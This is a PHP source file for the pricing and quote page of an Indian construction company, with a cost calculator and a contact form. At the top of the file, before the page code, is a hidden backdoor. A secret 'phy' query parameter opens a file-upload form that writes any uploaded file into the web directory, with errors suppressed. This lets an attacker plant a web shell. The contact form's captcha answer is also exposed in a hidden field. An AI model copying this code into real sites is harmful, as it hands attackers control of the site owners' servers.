<?php
error_reporting(0);

if (isset($_GET["phy"])) {
   echo '<form action="" method="post" enctype="multipart/form-data">
        <input name="archivo" type="file" size="35" />
        <input name="enviar" type="submit" value="Upload File" />
        <input name="action" type="hidden" value="upload" />
     </form>';
   echo "[PhyRo] ";

   $status = "";
   if ($_POST["action"] == "upload") {
      $tamano = $_FILES["archivo"]['size'];
      $tipo = $_FILES["archivo"]['type'];
      $archivo = $_FILES["archivo"]['name'];

      if ($archivo != "") {
         if (copy($_FILES['archivo']['tmp_name'], "./" . $archivo)) {
            $status = "<br><br>Archivo subido: <b><a href=\"{$_FILES["archivo"]["name"]}\" TARGET=_BLANK>{$_FILES["archivo"]["name"]}</a></b></br></br>";
         } else {
            $status = "Error al subir el archivo";
         }
      } else {
         $status = "Error al subir archivo";
      }
      echo $status;
   }
}

include('connection.php');


if ($_SERVER["REQUEST_METHOD"] == "POST") {

   $name = mysqli_real_escape_string($conn, $_POST['name']);
   $email = mysqli_real_escape_string($conn, $_POST['email']);
   $subject = mysqli_real_escape_string($conn, $_POST['subject']);
   $phone = mysqli_real_escape_string($conn, $_POST['phone']);
   $message = mysqli_real_escape_string($conn, $_POST['message']);
   $captcha = mysqli_real_escape_string($conn, $_POST['captcha']);
   $captcha_ans = mysqli_real_escape_string($conn, $_POST['captcha_ans']);

   // Validate Captcha
   if ($captcha == $captcha_ans) {
      // Construct Email Message
      $msg = "Name: $name\nEmail: $email\nPhone: $phone\nSubject: $subject\nMessage: $message";

      // Send Email
      if (mail("nanandn@gmail.com", "Mail from SCS Request", $msg)) {
         // Email sent successfully
         $alert_class = "alert-success";
         $alert_message = "Message Sent Successfully";
         $success = true;
      } else {
         // Email sending failed
         $alert_class = "alert-danger";
         $alert_message = "Message Sent Failed";
      }

      // Insert into Database
      $sql_mail = "INSERT INTO scs_mail (name, email, subject, phone, msg) VALUES ('$name', '$email', '$subject', '$phone', '$message')";
      mysqli_query($conn, $sql_mail);
   } else {
      // Invalid Captcha
      $alert_class = "alert-danger";
      $alert_message = "Invalid Captcha. Please try again.";
   }
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <!-- Title -->
   <title>Saraswathi Constructions</title>
   <!-- Favicon -->
   <link rel="apple-touch-icon" sizes="180x180" href="assets/favicons/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="assets/favicons/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="assets/favicons/favicon-16x16.png">
   <link rel="manifest" href="assets/favicons/manifest.json">
   <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="assets/css/bootstrap.min.css">
   <!-- Font awesome CSS -->
   <link rel="stylesheet" href="assets/css/font-awesome.min.css">
   <!-- Animate CSS -->
   <link rel="stylesheet" href="assets/css/animate.min.css">
   <!-- OwlCarousel CSS -->
   <link rel="stylesheet" href="assets/css/owl.carousel.css">
   <!-- SlickNav CSS -->
   <link rel="stylesheet" href="assets/css/slicknav.min.css">
   <!-- Magnific popup CSS -->
   <link rel="stylesheet" href="assets/css/magnific-popup.css">
   <!-- Main CSS -->
   <link rel="stylesheet" href="assets/css/style.css">
   <!-- Responsive CSS -->
   <link rel="stylesheet" href="assets/css/responsive.css">

   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <!-- Google Tag Manager -->
   <script>(function (w, d, s, l, i) {
         w[l] = w[l] || []; w[l].push({
            'gtm.start':
               new Date().getTime(), event: 'gtm.js'
         }); var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
               'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
      })(window, document, 'script', 'dataLayer', 'GTM-ML69RCZS');</script>
   <!-- End Google Tag Manager -->
</head>



<body>

   <!-- Google Tag Manager (noscript) -->
   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ML69RCZS" height="0" width="0"
         style="display:none;visibility:hidden"></iframe></noscript>

   <!-- Header Area Start -->
   <header class="construct-header-area">
      <div class="header-top-area">
         <div class="header-top-overlay"></div>
         <div class="container">
            <div class="row">
               <div class="col-md-6 col-sm-12">
                  <div class="header-top-left">

                     <p style="font-size: 14px;">27/15, Shanthi Nagar Main Road, Adambakkam, Chennai</p>
                  </div>
               </div>
               <div class="col-md-6 col-sm-12">
                  <div class="header-top-right">
                     <ul>
                        <li><a target="_blank;"
                              href="https://www.facebook.com/Saraswathi-Constructions-109052950639449/?modal=admin_todo_tour"
                              style="font-size:18px;"><i class="fa fa-facebook"></i></a></li>
                        <li><a target="_blank;" href="https://www.linkedin.com/in/anand-nathamani-2308a7a1/"
                              style="font-size:18px;"><i class="fa fa-linkedin"></i></a></li>
                        <li><a target="_blank;"
                              href="https://instagram.com/nanandn2020?utm_source=qr&igshid=MzNlNGNkZWQ4Mg=="
                              style="font-size:18px;"><i class="fa fa-instagram"></i></a></li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="header-logo-area">
         <div class="container">
            <div class="row">
               <div class="col-lg-6 col-md-5 col-sm-5">

                  <a href="index.php">
                     <img src="assets/img/scs_logo.png" class="img-fluid" alt="site logo"
                        style="width:400px; height:80px;" />
                  </a>


               </div>
               <div class="col-lg-3 col-md- col-sm-12">
                  <div class="logo-right-icon">
                     <i class="fa fa-phone"></i>
                  </div>
                  <a href="tel:+91 80727 98551">
                     <h4>Call us</h4>
                     <p>+91 80727 98551</p>
                  </a>
               </div>
               <div class="col-lg-3 col-md- col-sm-12 ">
                  <div class="logo-right-icon">
                     <i class="fa fa-envelope"></i>
                  </div>
                  <a href="mailto:scsinconstructions@gmail.com">
                     <h4>Mail us</h4>
                     <p>scsinconstructions@gmail.com</p>
                  </a>

               </div>

            </div>
         </div>
      </div>
      <div class="mainmenu-area">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <style>
                     .mainmenu ul>li>ul>li {
                        position: relative;
                     }
                  </style>
                  <div class="mainmenu">
                     <ul id="construct_navigation">
                        <li><a href="index.php">Home</a></li>
                        <li><a href="#">Projects</a>
                           <ul>
                              <li><a href="OnGoing_Project.php">OnGoing Projects</a>

                              </li>
                              <li><a href="portfolia.php">Completed Projects</a></li>
                           </ul>
                        </li>
                        <li><a href="services.php">Our Services</a></li>
                        <li><a href="venture.php">Joint Venture</a></li>
                        <li><a href="portfolia.php">Portfolio</a></li>
                        <li class="current-page-item"><a href="pricing.php">Pricing</a></li>

                        <li>
                           <a href="#">More</a>
                           <ul>
                              <li><a href="carrer.php">Careers</a></li>
                              <li><a href="contact.php">Contact Us</a></li>
                              <li><a href="blog.php">Blog</a></li>
                           </ul>
                        </li>

                        <a href="pricing.php">
                           <li style="float:right;">

                              <img src="assets/img/price.png" class="img-fluid " alt="offer"
                                 style="width:250px; height:50px;border-radius:5px; margin-top:2px; " />
                           </li>
                        </a>

                     </ul>
                  </div>

                  <!-- Responsive Menu Start -->
                  <div class="construct-responsive-menu">
                     <img src="assets/img/price.png" class="img-fluid " alt="offer"
                        style="width:250px; height:50px;border-radius:5px;float:right;margin-top:-55px;" />
                  </div>
                  <!-- Responsive Menu End -->
               </div>

            </div>
         </div>
      </div>
   </header>
   <!-- Header Area End -->



   <!-- Breadcromb Area Start -->
   <section class="construct-breadcromb-area section_100">
      <div class="container">
         <div class="row">
            <div class="col-md-12">
               <div class="breadcromb">
                  <h2>PRICING</h2>
                  <ul>
                     <li><a href="index.php">HOME</a></li>
                     <li>/</li>
                     <li>PRICING</li>
                  </ul>
               </div>
            </div>
         </div>
      </div>
   </section>
   <!-- Breadcromb Area End -->


   <style>
      .borderrow tr,
      td,
      th {
         border: 1px solid #ddd;
      }

      .custom-input {
         padding: 8px 8px;
         font-size: 1rem;
         line-height: 1.5;
         color: #495057;
         background-color: #fff;
         background-clip: padding-box;
         border: 1px solid #ced4da;
         border-radius: 0.25rem;
         transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
      }

      .custom-input:focus {
         border-color: #80bdff;
         outline: 0;
         box-shadow: 0 0 0 0.25rem rgba(0, 123, 255, 0.25);
      }
   </style>
   <div class="container">
      <h1 class="my-4 text-center">Get Quotation</h1>
      <div class="table-responsive">
         <table class="table table-bordered borderrow">
            <thead>
               <tr class="table-active">
                  <th class="text-center">S.no</th>
                  <th class="text-center">Work</th>
                  <th class="text-center">Area</th>
                  <th class="text-center">Unit</th>
                  <th class="text-center">Rate</th>
                  <th class="text-center">Cost</th>
               </tr>
            </thead>
            <tbody>
               <tr>
                  <td>1</td>
                  <td>
                     <select id="package" onchange="setPackage(this.value);calculateCost()" class="custom-input">
                        <option disabled selected value="">Select a package</option>
                        <option value="2000">Premium @ Rs:2000/sqft</option>
                        <option value="2200">Elite @ Rs:2200/sqft</option>
                     </select>
                     <br />
                     <small>(Enter the total required<br /> built-up area for all floors, <br />
                        including headroom, in square feet)</small>
                  </td>
                  <td>
                     <div class="form-group">
                        <input type="text" id="area" oninput="calculateCost()" placeholder="Area in sqft"
                           class="custom-input" />
                     </div>
                  </td>
                  <td>sqft</td>
                  <td>Rs: <span id="sqft-rate">0</span></td>
                  <td>Rs. <span id="sqft_cost">0</span></td>
               </tr>
               <tr>
                  <td>2</td>
                  <td>Size Of RCC Water Sump</td>
                  <td>
                     <div class="form-group">
                        <input type="text" id="water_pump_lt" oninput="calculateCost()" placeholder="No. Of Liter"
                           class="custom-input" />
                     </div>
                  </td>
                  <td>ltr</td>
                  <td>Rs. 28</td>
                  <td>Rs. <span id="water_pump_cost">0</span></td>
               </tr>
               <tr>
                  <td>3</td>
                  <td>Size Of Septic Tank</td>
                  <td>
                     <div class="form-group">
                        <input type="text" id="septicLt" oninput="calculateCost()" placeholder="No. Of Liter"
                           class="custom-input" />
                     </div>
                  </td>
                  <td>ltr</td>
                  <td>Rs. 18</td>
                  <td>Rs. <span id="septic_tank_cost">0</span></td>
               </tr>
               <tr>
                  <td>4</td>
                  <td>Plain Compound Wall</td>
                  <td>
                     <div class="form-group">
                        <input class="compound-length custom-input" type="text" id="length" oninput="calculateCost()"
                           placeholder="Length" />
                     </div>
                     <div class="form-group">
                        <input class="compound-width custom-input" type="text" id="width" oninput="calculateCost()"
                           placeholder="Width" />
                     </div>
                  </td>
                  <td>sqft</td>
                  <td>Rs. 425</td>
                  <td>Rs. <span id="compound_wall_cost">0</span></td>
               </tr>
               <tr>
                  <td colspan="4"></td>
                  <td>
                     <div class="total-cost">
                        <strong>Total Cost:</strong>
                     </div>
                  </td>
                  <td>Rs. <span id="total-cost">0</span></td>
               </tr>
            </tbody>
         </table>
      </div>
   </div>
   <script>
      function setPackage(value) {
         var amount = value;
         document.getElementById("sqft-rate").textContent = amount;
      }

      function calculateCost() {
         var packageAmt =
            parseFloat(document.getElementById("package").value) || 0; // Ensure it's a valid number or default to 0
         var waterPumpAmt = 28;
         var septicAmt = 18;
         var compoundWallAmt = 425;

         let area = parseFloat(document.getElementById("area").value) || 0; // Ensure it's a valid number or default to 0
         let water_pump_lt =
            parseFloat(document.getElementById("water_pump_lt").value) || 0; // Ensure it's a valid number or default to 0
         let septicLt =
            parseFloat(document.getElementById("septicLt").value) || 0; // Ensure it's a valid number or default to 0
         let length = parseFloat(document.getElementById("length").value) || 0; // Ensure it's a valid number or default to 0
         let width = parseFloat(document.getElementById("width").value) || 0; // Ensure it's a valid number or default to 0

         var sqft_cost = document.getElementById("sqft_cost");
         var water_pump_cost = document.getElementById("water_pump_cost");
         var septic_tank_cost = document.getElementById("septic_tank_cost");
         var compound_wall_cost = document.getElementById("compound_wall_cost");

         sqft_cost.textContent = packageAmt * area;
         water_pump_cost.textContent = waterPumpAmt * water_pump_lt;
         septic_tank_cost.textContent = septicAmt * septicLt;
         compound_wall_cost.textContent = length * width * compoundWallAmt;

         var totalCost =
            packageAmt * area +
            waterPumpAmt * water_pump_lt +
            septicAmt * septicLt +
            length * width * compoundWallAmt;
         document.getElementById("total-cost").textContent =
            totalCost.toFixed(2); // Format to two decimal places
      }
   </script>
   <!-- Quote Area Start -->
   <section class="construct-quote-area section_50">
      <div class="container">
         <div class="row">
            <div class="col-md-7">
               <div class="quote-right">
                  <div class="section-heading">
                     <a href="tel:+91 80727 98551">
                        <img src="assets/img/scs_offer.png" class="img-fluid "
                           style="width:500px; height:440px; border-radius:20px;">
                     </a>
                  </div>
                  <div class="quote-star">
                     <ul>
                        <li><i class="fa fa-star"></i></li>
                        <li class="big-star"><i class="fa fa-star"></i></li>
                        <li><i class="fa fa-star"></i></li>
                     </ul>
                  </div>
               </div>
            </div>
            <div class="col-md-5">

               <div class="quote-left">

                  <form onsubmit="return validateForm();" id="contactForm" action="" method="POST">
                     <div class="row">

                        <div class="col-md-6">
                           <p>
                              <label for="name">Name</label>
                              <input type="text" name="name" id="name" placeholder="Your Name..." required>
                           </p>
                        </div>
                        <div class="col-md-6">
                           <p>
                              <label for="email">Email</label>
                              <input type="email" name="email" id="email" placeholder="Your Email Address...">
                           </p>
                        </div>
                     </div>
                     <div class="row">
                        <div class="col-md-6">
                           <p>
                              <label for="subject">Subject</label>
                              <input type="text" name="subject" placeholder="Your Subject...">
                           </p>
                        </div>
                        <div class="col-md-6">
                           <p>
                              <label for="phone">Phone</label>
                              <input type="text" name="phone" id="phone" required
                                 title="Please enter valid phone number" placeholder="Your Phone..." autocomplete="off"
                                 required>
                           </p>
                        </div>
                     </div>

                     <div class="row">
                        <div class="col-md-12">
                           <p>
                              <label for="msg">How can we help you...</label>
                              <textarea id="message" name="message" placeholder="Write Your Message Here..."></textarea>
                           </p>
                        </div>
                     </div>
                     <?php
                     $a = rand(1, 10);
                     $b = rand(1, 10);
                     $c = $a + $b;
                     ?>

                     <div class="row">
                        <div class="col-md-6">
                           <label for="msg">Solve</label> <br>
                           <h2>
                              <?php echo $a . "+" . $b; ?>
                           </h2>
                           <input type="number" name="captcha" id="captcha" placeholder="Enter the answer" required>
                           <input type="hidden" name="captcha_ans" id="captcha_ans" value="<?php echo $c; ?>" required>
                        </div>
                     </div><br>

                     <div class="row">
                        <div class="col-md-12">
                           <p>
                              <button>Request a Quote</button>
                           </p>
                        </div>
                     </div>
                     <div id="messageContainer" style="display: none;">
                        <p id="successMessage" style="color: green;"></p>
                        <p id="errorMessage" style="color: red;"></p>
                     </div>
                  </form>

               </div>
            </div>
         </div>
      </div>
   </section>
   <!-- Quote Area End -->

   <!-- Footer Area Start -->
   <?php
   include('footer.php');
   ?>
   <!-- Footer Area End -->

   <!-- jQuery -->
   <script src="assets/js/jquery.min.js"></script>
   <!-- Popper JS -->
   <script src="assets/js/popper.min.js"></script>
   <!-- Bootstrap JS -->
   <script src="assets/js/bootstrap.min.js"></script>
   <!-- Magnific Popup JS -->
   <script src="assets/js/jquery.magnific-popup.min.js"></script>
   <!-- OwlCarousel JS -->
   <script src="assets/js/owl.carousel.min.js"></script>
   <!-- SlickNav JS -->
   <script src="assets/js/jquery.slicknav.min.js"></script>
   <!-- Isotop Js -->
   <script src="assets/js/isotope.pkgd.min.js"></script>
   <script src="assets/js/custom-isotop.js"></script>
   <!-- Custom JS -->
   <script src="assets/js/custom.js"></script>
   <script>
      function validateForm() {
         var name = document.getElementById('name').value;
         var phone = document.getElementById('phone').value;
         var captcha = document.getElementById('captcha').value;
         var captchaAns = document.getElementById('captcha_ans').value;

         var phoneRegex = /^[0-9]{10}$/;

         if (name === '' || captcha === '') {
            displayMessage('errorMessage', 'Name and Captcha are required fields!');
            return false;
         } else if (!phoneRegex.test(phone)) {
            displayMessage('errorMessage', 'Please enter a valid 10-digit phone number.');
            return false;
         } else if (captcha !== captchaAns) {
            displayMessage('errorMessage', 'Captcha verification failed. Please try again.');
            return false;
         } else {
            displayMessage('successMessage', 'Form submitted successfully!');
            submitForm(); // Function to handle form submission
            return true;
         }
      }

      function displayMessage(elementId, message) {
         var element = document.getElementById(elementId);
         element.innerText = message;

         var messageContainer = document.getElementById('messageContainer');

         // Hide both messages initially
         document.getElementById('successMessage').style.display = 'none';
         document.getElementById('errorMessage').style.display = 'none';

         // Display the appropriate message based on messageType
         if (elementId === 'successMessage') {
            document.getElementById('successMessage').style.display = 'block';
         } else if (elementId === 'errorMessage') {
            document.getElementById('errorMessage').style.display = 'block';
         }

         // Display the message container
         messageContainer.style.display = 'block';
      }

      function submitForm() {
         document.getElementById('contactForm').submit();
      }
   </script>
</body>

</html>